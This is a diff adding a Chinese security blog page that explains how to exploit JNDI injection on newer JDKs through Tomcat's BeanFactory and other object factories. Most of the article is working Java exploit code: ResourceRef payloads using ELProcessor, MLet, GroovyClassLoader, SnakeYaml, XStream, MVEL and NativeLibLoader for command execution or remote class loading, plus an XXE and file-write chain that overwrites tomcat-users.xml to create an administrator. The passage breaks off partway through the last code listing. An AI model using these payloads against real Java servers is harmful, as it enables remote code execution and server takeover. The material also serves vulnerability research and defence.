@@ -1,0 +1,526 @@
+<!DOCTYPE HTML>
+<html  lang="zh-CN">
+<head>
+    <meta http-equiv="Content-Type" charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>探索高版本 JDK 下 JNDI 漏洞的利用方法 - 浅蓝 's blog</title>
+	
+    <!-- 使用url函数转换相关路径 -->
+	<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js" data-no-instant></script>
+	<script src="/usr/themes/Bigfa/static/js/lately.min.js" data-no-instant></script>
+    <link rel="stylesheet" href="/usr/themes/Bigfa/static/css/style.css">
+	
+
+    <!-- 通过自有函数输出HTML头部信息 -->
+    <meta name="description" content="本文首发于跳跳糖社区https://tttang.com/archive/1405/前言高版本JDK在RMI和LDAP的trustURLCodebase都做了限制，从默认允许远程加载Object..." />
+<meta name="generator" content="Typecho 1.1/17.10.30" />
+<meta name="template" content="Bigfa" />
+<link rel="alternate" type="application/rss+xml" title="探索高版本 JDK 下 JNDI 漏洞的利用方法 &raquo; 浅蓝 's blog &raquo; RSS 2.0" href="https://b1ue.cn/feed/archives/529.html" />
+<link rel="alternate" type="application/rdf+xml" title="探索高版本 JDK 下 JNDI 漏洞的利用方法 &raquo; 浅蓝 's blog &raquo; RSS 1.0" href="https://b1ue.cn/feed/rss/archives/529.html" />
+<link rel="alternate" type="application/atom+xml" title="探索高版本 JDK 下 JNDI 漏洞的利用方法 &raquo; 浅蓝 's blog &raquo; ATOM 1.0" href="https://b1ue.cn/feed/atom/archives/529.html" />
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-529'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-529'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        triggers: ['scroll', 'mousemove', 'keyup', 'touchstart'],
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        triggers: ['onfocus', 'onmousemove', 'onkeyup', 'ontouchstart'],
+        load: 'onload'
+    }, added = false;
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-529'),
+            input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = '_';
+        input.value = (function () {
+    var _Eh3o = 'Kt'//'Kt'
++//'oT'
+'a'+'b'//'2t'
++//'sgt'
+'f1'+//'F'
+'F'+//'M'
+'85'+//'z'
+'6'+''///*'cQ'*/'cQ'
++//'j'
+'be'+'f'//'g'
++//'J'
+'40'+//'bSP'
+'8'+'355'//'C'
++//'4LD'
+'7'+//'S'
+'1'+//'D7k'
+'8'+//'WXq'
+'WXq'+//'u5S'
+'8'+//'dq3'
+'0'+//'6dI'
+'f8'+//'wF'
+'a0'+//'vTG'
+'e7b'+//'4'
+'9db'+'1'//'pko'
+, _0sGTZ7g = [[0,2],[4,5],[19,22]];
+    
+    for (var i = 0; i < _0sGTZ7g.length; i ++) {
+        _Eh3o = _Eh3o.substring(0, _0sGTZ7g[i][0]) + _Eh3o.substring(_0sGTZ7g[i][1]);
+    }
+
+    return _Eh3o;
+})();
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                function append() {
+                    if (!added) {
+                        forms[0].appendChild(input);
+                        added = true;
+                    }
+                }
+            
+                for (var i = 0; i < event.triggers.length; i ++) {
+                    var trigger = event.triggers[i];
+                    document[event.add](trigger, append);
+                    window[event.add](trigger, append);
+                }
+            }
+        }
+    });
+})();
+</script><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/styles/customemin.css" /><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/lines.css" /></head>
+
+<body class="is-enableBrandingButtons is-js">
+  <div class="site-main surface-container"> 
+    <div class="butterBar"><p class="butterBar-message"></p></div> 
+   
+   <header class="metabar metabar--bordered metabar--top u-clearfix"> 
+    <div class="metabar-block u-floatLeft" itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization"> 
+     <h1 class="site-title u-floatLeft" itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject"> <a href="https://b1ue.cn/" class="logo" title="浅蓝 's blog"> <img src="/logo.png" width="38" /></a></h1>  
+    </div> 
+    <div class="metabar-block metabar-center"> 
+		 <nav class="navTabs navTabs--metabar navTabs--narrow" itemtype="http://schema.org/SiteNavigationElement" itemscope=""> 
+			 <div class="layoutSingleColumn layoutSingleColumn--wide">
+				  <ul class="subnav-ul">
+										<li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/category.html">分类</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/archives.html">归档</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/links.html">友情链接</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/about.html">关于我</a></li>									  </ul>
+			 </div>
+		</nav> 
+    </div> 
+    <div class="metabar-block u-floatRight"> 
+     <form id="search" class="metabar-predictiveSearch search-form" action="https://b1ue.cn/" role="search" method="GET"> 
+        <label title="Search 浅蓝 's blog"> 
+        <svg xmlns="http://www.w3.org/2000/svg" style="display:none;">
+          <symbol viewBox="0 0 25 25" id="svg-search">
+            <title>svg-search</title>
+            <path d="M20.067 18.933l-4.157-4.157c.837-1.032 1.34-2.345 1.34-3.776 0-3.314-2.686-6-6-6s-6 2.686-6 6 2.686 6 6 6c1.43 0 2.744-.503 3.776-1.34l4.157 4.157c.113.113.27.183.442.183.345 0 .625-.28.625-.625 0-.173-.07-.33-.183-.442zM6.5 11c0-2.62 2.13-4.75 4.75-4.75S16 8.38 16 11s-2.13 4.75-4.75 4.75S6.5 13.62 6.5 11z"
+            />
+          </symbol>
+        </svg>
+        <svg viewBox="0 0 25 25" width="25" height="25" class="svgIcon">
+            <use class="svgIcon-use" xlink:href="#svg-search">
+            </use>
+        </svg>
+         <input id="input" class="textInput textInput--dark textInput--rounded" name="s" type="text" required="true" placeholder="Search 浅蓝 's blog" /> 
+  	   </label>
+     </form> 
+    </div> 
+   </header>
+
+
+    
+    
+
+<div class="layoutSingleColumn">
+    <article class="u-paddingTop50" itemscope="itemscope" itemtype="http://schema.org/Article">
+      <header class="entry-header">
+        <h2 class="entry-title" itemprop="headline">探索高版本 JDK 下 JNDI 漏洞的利用方法</h2>
+        <div class="entry-meta">
+            <a><time class="lately-a" datetime="2022-01-17 21:57:00" itemprop="datePublished">2022-01-17 21:57:00</time></a>
+            <span class="middotDivider"></span>
+            <a href="https://b1ue.cn/archives/529.html"><a href="https://b1ue.cn/category/review/">代码审计</a></a>
+        </div>
+      </header>
+
+      <meta itemscope itemprop="mainEntityOfPage"  itemType="https://schema.org/WebPage" itemid="https://b1ue.cn/archives/529.html"/>
+
+        <div class="grap" itemprop="articleBody">
+            <blockquote><p>本文首发于跳跳糖社区<br><a href="https://tttang.com/archive/1405/" target="_blank">https://tttang.com/archive/1405/</a></p></blockquote><h2>前言</h2><p>高版本JDK在RMI和LDAP的<code>trustURLCodebase</code>都做了限制，从默认允许远程加载ObjectFactory变成了不允许。RMI是在6u132, 7u122, 8u113版本开始做了限制，LDAP是 11.0.1, 8u191, 7u201, 6u211版本开始做了限制。</p><p>所以修复后的JDK版本无法在不修改<code>trustURLCodebase</code>的情况下通过远程加载ObjectFactory类的方式去执行Java代码。</p><p>虽然无法再使用远程加载类，但绕过限制的方法也随之出现。目前公开常用的利用方法是通过Tomcat的<code>org.apache.naming.factory.BeanFactory</code> 工厂类去调用 <code>javax.el.ELProcessor#eval</code>方法或<code>groovy.lang.GroovyShell#evaluate</code>方法，还有通过LDAP的 <code>javaSerializedData</code>反序列化gadget，可以说这三种方法几乎涵盖了大部分的场景。关于这一部分内容<a href="https://paper.seebug.org/942/" target="_blank">《如何绕过高版本 JDK 的限制进行 JNDI 注入利用》</a>讲的挺详细的。</p><p>虽然这三种方式比较常用，但还是难免会遇到特殊情况。比如系统使用的是 Tomcat7（没有ELProcessor），或是没有 groovy 依赖，又或是没有本地可用的反序列化 gadget，还有可能连 Tomcat 都没有（无法使用 BeanFactory），一般这时候有些人可能就放弃了，所以本文主要探讨一下我在遇到这种情况后研究发现的几个利用方法。</p><h2>基于BeanFactory</h2><p>我首先简要讲一下<code>org.apache.naming.factory.BeanFactory</code>的绕过原理。</p><hr><p>EL和Groovy之所以能打是因为LDAP和RMI在收到服务端反序列化来的<code>Reference</code>对象后根据<code>classFactory</code>属性从本地classpath中实例化一个 ObjectFactory 对象，然后调用这个对象的 <code>getObjectInstance</code> 方法。</p><p>在Tomcat的<code>catalina.jar</code>中有一个<code>org.apache.naming.factory.BeanFactory</code>类，这个类会把<code>Reference</code>对象的<code>className</code>属性作为类名去调用无参构造方法实例化一个对象。然后再从<code>Reference</code>对象的Addrs参数集合中取得 AddrType 是 forceString 的 String 参数。</p><p>接着根据取到的 forceString 参数按照<code>,</code>逗号分割成多个要执行的方法。再按<code>=</code>等于号分割成 propName 和 param。</p><p>最后会根据 propName 作为方法名称去反射获取一个参数类型是 <code>String.class</code>的方法，并按照 param 从 Addrs 中取到的 String 对象作为参数去反射调用该方法。</p><p>而刚好<code>javax.el.ELProcessor#eval</code>和 <code>groovy.lang.GroovyShell#evaluate</code>这两个方法都是可以只传一个String参数就能够执行攻击代码，且依赖库比较常见所以被经常使用。</p><pre><code class="lang-java">ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;,
+        true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);
+ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));
+
+ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/bash','-c','/Applications/Calculator.app/Contents/MacOS/Calculator']).start()\&quot;)&quot;));
+return ref;</code></pre><p>依照上面的原理解释，这段代码得到的ResourceRef对象在JNDI客户端处理时，实际上等价于下面这段代码。</p><pre><code class="lang-java">new javax.el.ELProcessor().eval(&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/bash','-c','/Applications/Calculator.app/Contents/MacOS/Calculator']).start()\&quot;)&quot;)</code></pre><hr><p>我在找合适的利用类时是按照这个条件找的。</p><ul><li>JDK或者常用库的类</li><li>有public修饰的无参构造方法</li><li>public修饰的只有一个String.class类型参数的方法，且该方法可以造成漏洞</li></ul><h3>MLet</h3><p>根据这个条件我找到了<code>javax.management.loading.MLet</code>，是 JDK 自带的。</p><p><img src="/usr/upload/image-20220111171752025.png" alt="image-20220111171752025" title="image-20220111171752025"></p><p>MLet 继承自 URLClassloader，有一个无参构造方法，还有一个 <code>addURL(String)</code>方法，它的父类还有一个 <code>loadClass(String)</code>方法。</p><p>刚好满足条件。</p><pre><code class="lang-java">MLet mLet = new MLet();
+mLet.addURL(&quot;http://127.0.0.1:2333/&quot;);
+mLet.loadClass(&quot;Exploit&quot;);</code></pre><p>这样就相当于是通过 URLClassloader 去远程加载类了。</p><p>但这里有一个问题，要想执行远程类的代码必须经过初始化或者实例化，单靠 ClassLoader.loadClass 无法触发 static 代码块，所以这里暂时没法 RCE。</p><p>不过我经过研究发现还可以用来进行gadget探测。例如在不知道当前Classpath存在哪些可用的gadget时，就可以通过MLet进行第一次类加载，如果类加载成功就不会影响后面访问远程类。反之如果第一次类加载失败就会抛出异常结束后面的流程，也就不会访问远程类。</p><pre><code class="lang-java">private static ResourceRef tomcatMLet() {
+    ResourceRef ref = new ResourceRef(&quot;javax.management.loading.MLet&quot;, null, &quot;&quot;, &quot;&quot;,
+            true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);
+    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=loadClass,b=addURL,c=loadClass&quot;));
+    ref.add(new StringRefAddr(&quot;a&quot;, &quot;javax.el.ELProcessor&quot;));
+    ref.add(new StringRefAddr(&quot;b&quot;, &quot;http://127.0.0.1:2333/&quot;));
+    ref.add(new StringRefAddr(&quot;c&quot;, &quot;Blue&quot;));
+    return ref;
+}</code></pre><p><img src="/usr/upload/image-20220112210141679.png" alt="image-20220112210141679" title="image-20220112210141679"></p><h3>GroovyClassLoader</h3><p>和 MLet 基本原理一样，不同于MLet的是GroovyClassLoader可以RCE，不过因为 Groovy 已经有一个 <code>groovy.lang.GroovyShell</code>可以用了，所以这个类并不能体现出价值。</p><p><img src="/usr/upload/image-20220112211250086.png" alt="image-20220112211250086" title="image-20220112211250086"></p><pre><code>private static ResourceRef tomcatGroovyClassLoader() {
+    ResourceRef ref = new ResourceRef(&quot;groovy.lang.GroovyClassLoader&quot;, null, &quot;&quot;, &quot;&quot;,
+            true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);
+    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=addClasspath,b=loadClass&quot;));
+    ref.add(new StringRefAddr(&quot;a&quot;, &quot;http://127.0.0.1:8888/&quot;));
+    ref.add(new StringRefAddr(&quot;b&quot;, &quot;blue&quot;));
+    return ref;
+}</code></pre><p><strong>blue.groovy</strong></p><pre><code>@groovy.transform.ASTTest(value={assert Runtime.getRuntime().exec(&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)})
+class Person{}</code></pre><h3>SnakeYaml</h3><p>在我以往所看过的源码中依赖库使用SnakeYaml比Groovy更常见，<code>new org.yaml.snakeyaml.Yaml().load(String)</code>也刚好符合条件，所以还是很有价值的。</p><pre><code>private static ResourceRef tomcat_snakeyaml(){
+    ResourceRef ref = new ResourceRef(&quot;org.yaml.snakeyaml.Yaml&quot;, null, &quot;&quot;, &quot;&quot;,
+            true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);
+    String yaml = &quot;!!javax.script.ScriptEngineManager [\n&quot; +
+            &quot;  !!java.net.URLClassLoader [[\n&quot; +
+            &quot;    !!java.net.URL [\&quot;http://127.0.0.1:8888/exp.jar\&quot;]\n&quot; +
+            &quot;  ]]\n&quot; +
+            &quot;]&quot;;
+    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=load&quot;));
+    ref.add(new StringRefAddr(&quot;a&quot;, yaml));
+    return ref;
+}</code></pre><p><img src="/usr/upload/image-20220112213733959.png" alt="image-20220112213733959" title="image-20220112213733959"></p><h3>XStream</h3><p><code>new com.thoughtworks.xstream.XStream().fromXML(String)</code>同样符合条件。</p><pre><code>private static ResourceRef tomcat_xstream(){
+    ResourceRef ref = new ResourceRef(&quot;com.thoughtworks.xstream.XStream&quot;, null, &quot;&quot;, &quot;&quot;,
+            true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);
+    String xml = &quot;&lt;java.util.PriorityQueue serialization='custom'&gt;\n&quot; +
+            &quot;  &lt;unserializable-parents/&gt;\n&quot; +
+            &quot;  &lt;java.util.PriorityQueue&gt;\n&quot; +
+            &quot;    &lt;default&gt;\n&quot; +
+            &quot;      &lt;size&gt;2&lt;/size&gt;\n&quot; +
+            &quot;    &lt;/default&gt;\n&quot; +
+            &quot;    &lt;int&gt;3&lt;/int&gt;\n&quot; +
+            &quot;    &lt;dynamic-proxy&gt;\n&quot; +
+            &quot;      &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&quot; +
+            &quot;      &lt;handler class='sun.tracing.NullProvider'&gt;\n&quot; +
+            &quot;        &lt;active&gt;true&lt;/active&gt;\n&quot; +
+            &quot;        &lt;providerType&gt;java.lang.Comparable&lt;/providerType&gt;\n&quot; +
+            &quot;        &lt;probes&gt;\n&quot; +
+            &quot;          &lt;entry&gt;\n&quot; +
+            &quot;            &lt;method&gt;\n&quot; +
+            &quot;              &lt;class&gt;java.lang.Comparable&lt;/class&gt;\n&quot; +
+            &quot;              &lt;name&gt;compareTo&lt;/name&gt;\n&quot; +
+            &quot;              &lt;parameter-types&gt;\n&quot; +
+            &quot;                &lt;class&gt;java.lang.Object&lt;/class&gt;\n&quot; +
+            &quot;              &lt;/parameter-types&gt;\n&quot; +
+            &quot;            &lt;/method&gt;\n&quot; +
+            &quot;            &lt;sun.tracing.dtrace.DTraceProbe&gt;\n&quot; +
+            &quot;              &lt;proxy class='java.lang.Runtime'/&gt;\n&quot; +
+            &quot;              &lt;implementing__method&gt;\n&quot; +
+            &quot;                &lt;class&gt;java.lang.Runtime&lt;/class&gt;\n&quot; +
+            &quot;                &lt;name&gt;exec&lt;/name&gt;\n&quot; +
+            &quot;                &lt;parameter-types&gt;\n&quot; +
+            &quot;                  &lt;class&gt;java.lang.String&lt;/class&gt;\n&quot; +
+            &quot;                &lt;/parameter-types&gt;\n&quot; +
+            &quot;              &lt;/implementing__method&gt;\n&quot; +
+            &quot;            &lt;/sun.tracing.dtrace.DTraceProbe&gt;\n&quot; +
+            &quot;          &lt;/entry&gt;\n&quot; +
+            &quot;        &lt;/probes&gt;\n&quot; +
+            &quot;      &lt;/handler&gt;\n&quot; +
+            &quot;    &lt;/dynamic-proxy&gt;\n&quot; +
+            &quot;    &lt;string&gt;/System/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;\n&quot; +
+            &quot;  &lt;/java.util.PriorityQueue&gt;\n&quot; +
+            &quot;&lt;/java.util.PriorityQueue&gt;&quot;;
+    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=fromXML&quot;));
+    ref.add(new StringRefAddr(&quot;a&quot;, xml));
+    return ref;
+}</code></pre><p><img src="/usr/upload/image-20220112214028813.png" alt="image-20220112214028813" title="image-20220112214028813"></p><h3>MVEL</h3><p>xstream、snakeyaml 这种属于入口就符合gadget条件，而MVEL的入口<code>org.mvel2.MVEL#eval(String)</code>因为无参构造方法是private修饰的，所以不符合条件。</p><p>不过最终我还是找到了可以用的类。</p><p><img src="/usr/upload/image-20220112223915953.png" alt="image-20220112223915953" title="image-20220112223915953"></p><pre><code>&quot;help&quot; -&gt; {<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="eda588819daddadddb">[email&#160;protected]</a>} 
+&quot;exit&quot; -&gt; {<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="4d083524390d7a7d75">[email&#160;protected]</a>} 
+&quot;cd&quot; -&gt; {<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="14577c757a7371437b667f7d7a73507d6654232524">[email&#160;protected]</a>} 
+&quot;set&quot; -&gt; {<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="86d5e3f2c6b1b7b4">[email&#160;protected]</a>} 
+&quot;showvars&quot; -&gt; {<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="287b40475f7e495a5b681f191c">[email&#160;protected]</a>} 
+&quot;ls&quot; -&gt; {<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d591bca799bca6a195e2e4e3">[email&#160;protected]</a>} 
+&quot;inspect&quot; -&gt; {<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e1ae838b848295a88f92918482958e93a1d6d0d9">[email&#160;protected]</a>} 
+&quot;pwd&quot; -&gt; {<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e4b4968d8a90b38b968f8d8a83a08d968187908b969da4d3d6d4">[email&#160;protected]</a>} 
+&quot;push&quot; -&gt; {<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="08587d7b604b67667c6d707c483f3a3a">[email&#160;protected]</a>} </code></pre><p>从<code>org.mvel2.sh.ShellSession#exec(String)</code>进入会按照内置的几个命令进行处理。</p><p>我把内置的几个命令类都看了一遍，其中发现<code>org.mvel2.sh.command.basic.PushContext</code>有调用<code>MVEL.eval</code>去解析表达式。</p><p><img src="/usr/upload/image-20220112224105773.png" alt="image-20220112224105773" title="image-20220112224105773"></p><p>那也就说明我能够通过 <code>ShellSession.exec(String)</code> 去执行push命令，从而解析MVEL表达式。</p><pre><code>private static ResourceRef tomcat_MVEL(){
+    ResourceRef ref = new ResourceRef(&quot;org.mvel2.sh.ShellSession&quot;, null, &quot;&quot;, &quot;&quot;,
+            true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);
+    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=exec&quot;));
+    ref.add(new StringRefAddr(&quot;a&quot;,
+            &quot;push Runtime.getRuntime().exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator');&quot;));
+    return ref;
+}</code></pre><p><img src="/usr/upload/image-20220112225050428.png" alt="image-20220112225050428" title="image-20220112225050428"></p><h3>NativeLibLoader</h3><p><code>com.sun.glass.utils.NativeLibLoader</code>是JDK的类，它有一个<code>loadLibrary(String)</code>方法。</p><p><img src="/usr/upload/image-20220113002036895.png" alt="image-20220113002036895" title="image-20220113002036895"></p><p>它会去加载指定路径的动态链接库文件，所以只要能够通过WEB功能或者写文件gadget上传一个动态链接库就可以用<code>com.sun.glass.utils.NativeLibLoader</code>来加载并执行命令。</p><pre><code>private static ResourceRef tomcat_loadLibrary(){
+    ResourceRef ref = new ResourceRef(&quot;com.sun.glass.utils.NativeLibLoader&quot;, null, &quot;&quot;, &quot;&quot;,
+            true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);
+    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=loadLibrary&quot;));
+    ref.add(new StringRefAddr(&quot;a&quot;, &quot;/../../../../../../../../../../../../tmp/libcmd&quot;));
+    return ref;
+}</code></pre><p><img src="/usr/upload/image-20220113000634617.png" alt="image-20220113000634617" title="image-20220113000634617"></p><h2>XXE & RCE</h2><p>我通过搜索所有实现<code>javax.naming.spi.ObjectFactory</code>接口的类，然后挨个查看代码，其中发现了一个Tomcat的工厂类<code>org.apache.catalina.users.MemoryUserDatabaseFactory</code>可能会存在漏洞。</p><p><img src="/usr/upload/image-20220113184129936.png" alt="image-20220113184129936" title="image-20220113184129936"></p><p>这里会先实例化一个<code>MemoryUserDatabase</code>对象然后从 Reference 中取出 pathname、readonly 这两个最主要的参数并调用 setter 方法赋值。</p><p>赋值完成会先调用<code>open()</code>方法，如果readonly=false那就会调用<code>save()</code>方法。</p><p>首先来看<code>open()</code>方法</p><p><img src="/usr/upload/image-20220113184944685.png" alt="image-20220113184944685" title="image-20220113184944685"></p><h3>XXE</h3><p>这里会根据pathname去发起本地或者远程文件访问，并使用 commons-digester 解析返回的 XML 内容。那这里就可以 XXE。</p><p><img src="/usr/upload/image-20220113185434444.png" alt="image-20220113185434444" title="image-20220113185434444"></p><h3>RCE</h3><p>前面在解析XML的时候有这样一段代码</p><pre><code>digester.addFactoryCreate(&quot;tomcat-users/group&quot;, new MemoryGroupCreationFactory(this), true);
+digester.addFactoryCreate(&quot;tomcat-users/role&quot;, new MemoryRoleCreationFactory(this), true);
+digester.addFactoryCreate(&quot;tomcat-users/user&quot;, new MemoryUserCreationFactory(this), true);</code></pre><p>这里分别根据xml解析结果给 <code>MemoryUserDatabase#groups,MemoryUserDatabase#users,MemoryUserDatabase#roles</code>填充数据。</p><p>以 users 为例。</p><p><img src="/usr/upload/image-20220113185737827.png" alt="image-20220113185737827" title="image-20220113185737827"></p><p>首先从<code>org.apache.catalina.users.MemoryUserCreationFactory#createObject</code>中取出了 username，password 元素。</p><p><img src="/usr/upload/image-20220113190006305.png" alt="image-20220113190006305" title="image-20220113190006305"></p><p>然后调用<code>org.apache.catalina.users.MemoryUserDatabase#createUser</code>这时 MemoryUser 对象被添加到了 users 对象里，这样 users 就不是空的了。这里不能为空的原因是后面写文件内容时是从，users、groups、roles里取的。</p><p>接着看<code>save()</code>方法。</p><p><img src="/usr/upload/image-20220113190245335.png" alt="image-20220113190245335" title="image-20220113190245335"></p><p>进入 <code>save()</code>方法的主逻辑代码需要先经过 isWriteable()==true 的判断。</p><p><img src="/usr/upload/image-20220113190341083.png" alt="image-20220113190341083" title="image-20220113190341083"></p><p>这里出现了第一个问题，由于需要控制文件写入内容，所以必须要让 pathname 是一个远程URL，如果是远程URL的话这里把<code>catalina.base+pathname</code> 组成文件名去实例化了一个 File 对象，所以这个目录必然<strong>不存在、不是目录、不可写</strong>，也就无法通过判断。</p><p>那如果用目录跳转呢？假如 <code>CATALINA.BASE=/usr/apache-tomcat-8.5.73/</code>,<code>pathname=http://127.0.0.1:8888/../../conf/tomcat-users.xml</code></p><p>他们组成的文件路径就是<code>/usr/apache-tomcat-8.5.73/http:/127.0.0.1:8888/../../conf/tomcat-users.xml</code></p><p>getParentFile 获取到的是 <code>/usr/apache-tomcat-8.5.73/http:/127.0.0.1:8888/../../conf/</code></p><p>在 Windows 下这样没问题，但如果是Linux系统的话，目录跳转符号前面的目录是必须存在的。</p><p>所以要解决Linux系统下的问题，必须要让 <code>CATALINA.BASE</code>文件夹下有<code>/http:/REMOTE_IP/</code> 这个目录的存在，这就需要用到<code>BeanFactory</code>来执行一个<strong>可以创建目录</strong>的利用类。</p><p>我随便找了一个<code>org.h2.store.fs.FileUtils#createDirectory(String)</code>，创建目录的gadget花点时间应该能找到很多更通用的。</p><p><img src="/usr/upload/image-20220113200001075.png" alt="image-20220113200001075" title="image-20220113200001075"></p><pre><code>private static ResourceRef tomcatMkdirFrist() {
+    ResourceRef ref = new ResourceRef(&quot;org.h2.store.fs.FileUtils&quot;, null, &quot;&quot;, &quot;&quot;,
+            true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);
+    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=createDirectory&quot;));
+    ref.add(new StringRefAddr(&quot;a&quot;, &quot;../http:&quot;));
+    return ref;
+}
+private static ResourceRef tomcatMkdirLast() {
+    ResourceRef ref = new ResourceRef(&quot;org.h2.store.fs.FileUtils&quot;, null, &quot;&quot;, &quot;&quot;,
+            true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);
+    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=createDirectory&quot;));
+    ref.add(new StringRefAddr(&quot;a&quot;, &quot;../http:/127.0.0.1:8888&quot;));
+    return ref;
+}</code></pre><p>因为要在 <code>CATALINA.BASE</code>创建目录，所以需要从工作目录<code>CATALINA.BASE/bin</code> 向上跳一级，分别执行 tomcatMkdirFrist 和 tomcatMkdirLast ，这样 <code>CATALINA.BASE</code>目录下就会创建出一个 <code>http:</code>目录和它的子目录<code>127.0.0.1:8888</code>。</p><p><img src="/usr/upload/image-20220113200915388.png" alt="image-20220113200915388" title="image-20220113200915388"></p><p>当这两个目录被创建成功后，Linux环境下 isWriteable() 的校验也就通过了。</p><p><img src="/usr/upload/image-20220113235742512.png" alt="image-20220113235742512" title="image-20220113235742512"></p><p>前面这部分会先把事先在 <code>open()</code> 方法就解析好的 <code>users、groups、roles</code>都写入到 pathnameNew 这个文件里。</p><p>如果pathname是<code>/usr/apache-tomcat-8.5.73/http:/127.0.0.1:8888/../../conf/tomcat-users.xml</code></p><p>那pathnameNew就是<code>/usr/apache-tomcat-8.5.73/http:/127.0.0.1:8888/../../conf/tomcat-users.xml.new</code></p><p><img src="/usr/upload/image-20220114000042782.png" alt="image-20220114000042782" title="image-20220114000042782"></p><p>最后会把 pathnameNew 这个文件移动到 pathname。</p><p>写文件的原理摸清楚了就可以开始准备RCE，RCE的方法有两种，分别是覆盖 tomcat-users.xml 和写 webshell 。</p><h4>创建Tomcat管理员</h4><p>我首先在本地启动了一个8888端口，并存放了一个 <code>conf/tomcat-users.xml</code> 文件。</p><p>访问<code>http://127.0.0.1:8888/conf/tomcat-users.xml</code>效果如下</p><p><img src="/usr/upload/image-20220113201357425.png" alt="image-20220113201357425" title="image-20220113201357425"></p><pre><code>private static ResourceRef tomcatManagerAdd() {
+    ResourceRef ref = new ResourceRef(&quot;org.apache.catalina.UserDatabase&quot;, null, &quot;&quot;, &quot;&quot;,
+            true, &quot;org.apache.catalina.users.MemoryUserDatabaseFactory&quot;, null);
+    ref.add(new StringRefAddr(&quot;pathname&quot;, &quot;http://127.0.0.1:8888/../../conf/tomcat-users.xml&quot;));
+    ref.add(new StringRefAddr(&quot;readonly&quot;, &quot;false&quot;));
+    return ref;
